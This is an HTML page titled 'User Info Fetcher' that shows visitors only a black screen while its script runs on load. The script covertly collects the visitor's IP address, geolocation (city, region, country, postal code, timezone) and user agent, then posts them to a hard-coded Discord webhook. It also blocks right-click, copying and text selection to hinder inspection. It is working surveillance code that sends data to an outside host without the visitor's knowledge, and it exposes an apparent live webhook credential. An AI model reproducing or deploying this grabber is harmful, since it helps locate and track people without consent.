<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Info Fetcher</title>
    <style>
        body {
            background-color: black;
            color: white;
            overflow: hidden; /* Disable scrolling */
        }

        /* Disable text selection */
        body::selection {
            background-color: transparent;
        }

        body::-moz-selection {
            background-color: transparent;
        }
    </style>
</head>
<body oncontextmenu="return false" oncopy="return false"> <!-- Disable right-click and copying -->

<script>
  // Function to fetch user's IP address
  async function getIpAddress() {
    const response = await fetch('https://api64.ipify.org?format=json'); // Use api64 to ensure IPv6 compatibility
    const data = await response.json();
    return data.ip;
  }

  // Function to determine IP type (IPv4 or IPv6)
  function getIpType(ipAddress) {
    return ipAddress.includes(':') ? 'IPv6' : 'IPv4';
  }

  // Function to fetch location information from ipinfo.io
  async function getLocationInfo(ipAddress) {
    const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
    const data = await response.json();
    return data;
  }

  // Function to get user agent
  function getUserAgent() {
    return navigator.userAgent;
  }

  // Function to send data to Discord webhook as an embedded message
  async function sendToDiscord(ipAddress, locationInfo, userAgent) {
    const { city, region, timezone, postal, country } = locationInfo;
    const ipType = getIpType(ipAddress);

    const webhookURL = 'https://discord.com/api/webhooks/1197319022455300147/hnBvBYUy-eHX9vSz8S_-jMFtQ805c7pUcoQqkLB6ZSCzE_h87CHjMPrMy6aqNXFdT_P7'; // Replace with your Discord webhook URL

    // Convert RGB color (49, 51, 56) to Discord format
    const discordColor = (49 << 16) + (51 << 8) + 56;

    // Create payload for Discord webhook as an embedded message with color #313338
    const payload = {
        embeds: [{
            title: ipAddress.toLowerCase(), // Set the title of the embed as the user's IP address in lowercase
            color: discordColor, // Set the color of the embed (Discord format)
            fields: [
                { name: "City", value: city ? city.toLowerCase() : 'N/A' },
                { name: "Region", value: region ? region.toLowerCase() : 'N/A' },
                { name: "Country", value: country ? country.toLowerCase() : 'N/A' },
                { name: "Zip Code", value: postal ? postal.toLowerCase() : 'N/A' },
                { name: "Timezone", value: timezone ? timezone.toLowerCase() : 'N/A' },
                { name: "IP Type", value: ipType.toLowerCase() },
                { name: "User Agent", value: userAgent.toLowerCase() },
            ],
        }],
    };

    // Send data to Discord webhook
    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });
  }

  // Main function to orchestrate the process
  async function main() {
    try {
      const ipAddress = await getIpAddress();
      const locationInfo = await getLocationInfo(ipAddress);
      const userAgent = getUserAgent();
      await sendToDiscord(ipAddress, locationInfo, userAgent);
    } catch (error) {
      console.error('Error:', error);
    }
  }

  // Call the main function
  main();
</script>

</body>
</html>
